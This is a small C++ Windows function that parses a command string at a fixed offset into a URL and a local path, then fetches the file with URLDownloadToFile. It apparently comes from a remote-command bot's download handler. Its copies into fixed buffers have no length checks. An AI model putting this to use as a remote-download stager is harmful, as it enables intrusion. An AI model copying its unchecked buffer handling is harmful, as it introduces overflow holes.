#include <windows.h>
#include <urlmon.h>

bool Download(char Command[200]);

bool Download(char Command[200])
{
	unsigned short	UrlStart = 10;
	unsigned short	UrlEnd;
	char			Url[100];

	unsigned short	LocalPathStart;
	unsigned short	LocalPathEnd;
	char			LocalPath[100];

	UrlEnd = GetParameter(Command, UrlStart);
	lstrcpyn(Url, Command + UrlStart, UrlEnd - UrlStart);
	
	LocalPathStart = UrlEnd + 2;
	LocalPathEnd = GetParameter(Command, LocalPathStart);
	lstrcpyn(LocalPath, Command + LocalPathStart, LocalPathEnd - LocalPathStart);

	if(URLDownloadToFile(0, Url, LocalPath, 0, 0) == S_OK) return true;

	return false;
}